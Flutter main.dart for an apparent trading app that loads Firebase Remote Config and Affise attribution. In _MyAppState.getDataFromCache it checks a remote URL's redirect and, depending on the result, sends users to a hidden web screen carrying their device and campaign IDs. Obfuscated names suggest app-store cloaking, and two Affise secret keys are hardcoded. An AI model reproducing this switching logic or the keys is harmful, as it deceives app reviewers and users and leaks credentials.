import 'dart:async';
import 'dart:io';

import 'package:affise_attribution_lib/affise.dart';
import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter_phoenix/flutter_phoenix.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:stake_trade/pages/splash_page.dart';

import 'pages/confx.dart';
import 'pages/dasxa.dart';
import 'pages/onBoarding_page.dart';

late SharedPreferences prefs;
final remoteConfig = FirebaseRemoteConfig.instance;
int? initScreen;
Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: Stx.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();

  await getTracking();
  await Noxa().activate();
  await gdfhfg();

  SharedPreferences preferences = await SharedPreferences.getInstance();
  initScreen = preferences.getInt('initScreen');
  await preferences.setInt('initScreen', 1);
  runApp(Phoenix(child: const MyApp()));
}

Future<void> modules() async {}
String promo = '';
final gdf = InAppReview.instance;

Future<void> gdfhfg() async {
  await deas();
  bool fsd = prefs.getBool('cas') ?? false;
  if (!fsd) {
    if (await gdf.isAvailable()) {
      gdf.requestReview();
      await prefs.setBool('cas', true);
    }
  }
}

Future<void> deas() async {
  prefs = await SharedPreferences.getInstance();
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

Future<void> getTracking() async {
  final TrackingStatus status =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(status);
}

String iduser = '';
String campaignn = '';
void checkData(List<AffiseKeyValue> data) {
  for (AffiseKeyValue keyValue in data) {
    if (keyValue.key == 'campaign_id' || keyValue.key == 'campaign') {
      campaignn = keyValue.value;
    }
  }
}

class _MyAppState extends State<MyApp> {
  @override
  void initState() {
    super.initState();

    Affise.settings(
      affiseAppId: "588",
      secretKey: "8d997b86-e131-4f27-a021-adc1a646da11",
    ).start();
    Affise.moduleStart(AffiseModules.ADVERTISING);
    Affise.getModulesInstalled().then((modules) {
      print("Modules: $modules");
    });
    getDevice();
    Affise.getStatus(AffiseModules.ADVERTISING, (data) {
      print(data);
    });
  }

  String camp = '';

  Future<void> getDevice() async {
    final String dev = await Affise.getRandomDeviceId();
    Completer<void> completer = Completer<void>();
    Affise.getStatus(AffiseModules.STATUS, (response) {
      String campaignNameValue = '';
      for (var item in response) {
        if (item.key == 'campaign_name') {
          campaignNameValue = item.value;
          camp = campaignNameValue;
          if (!completer.isCompleted) {
            completer.complete();
          }
          break;
        }
      }
      if (camp.isEmpty && !completer.isCompleted) {
        completer.completeError("Campaign name not found");
      }
    });

    return Future.any([
      completer.future,
      Future.delayed(const Duration(seconds: 5), () {
        if (!completer.isCompleted) {
          camp = 'notFound';
          completer.complete();
        }
      })
    ]);
  }

  Future<bool> getBoolFromPrefs() async {
    final bool value = prefs.getBool('start') ?? false;

    await Future.delayed(const Duration(seconds: 2));

    return value;
  }

  Future<bool> getDataFromCache() async {
    final remoteConfig = FirebaseRemoteConfig.instance;
    await remoteConfig.fetchAndActivate();

    Affise.settings(
      affiseAppId: "590",
      secretKey: "7c80cd7e-bbf3-4638-880d-bb3f15bc545d",
    ).start();
    Affise.moduleStart(AffiseModules.ADVERTISING);

    Affise.getModulesInstalled().then((modules) {
      print("Modules: $modules");
    });
    iduser = await Affise.getRandomDeviceId();
    Affise.getStatus(AffiseModules.ADVERTISING, (data) {
      checkData(data);
    });
    datx();

    String das = remoteConfig.getString('trader');
    String exampleValue = remoteConfig.getString('traderFerw');
    final client = HttpClient();
    var uri = Uri.parse(das);
    var request = await client.getUrl(uri);
    request.followRedirects = false;
    var response = await request.close();
    if (!das.contains('newnill')) {
      if (response.headers.value(HttpHeaders.locationHeader).toString() !=
          exampleValue) {
        promo = '$das&affise_device_id$iduser&campaignid=$campaignn';
        return true;
      }
    }
    return false;
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.deepPurple),
        useMaterial3: true,
      ),
      home: FutureBuilder<bool>(
        future: getDataFromCache(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.white,
              child: const Center(
                child: CircularProgressIndicator(
                  color: Colors.blueAccent,
                ),
              ),
            );
          } else {
            if (snapshot.data == true && promo != '') {
              return NewItemScreen(details: promo);
            } else {
              return const SplachScreen();
            }
          }
        },
      ),
    );
  }
}

void datx() {
  Affise.getStatus(AffiseModules.ADVERTISING, (data) {
    checkData(data);
  });

  Affise.getStatus(AffiseModules.NETWORK, (data) {
    checkData(data);
  });

  Affise.getStatus(AffiseModules.STATUS, (data) {
    checkData(data);
  });
}
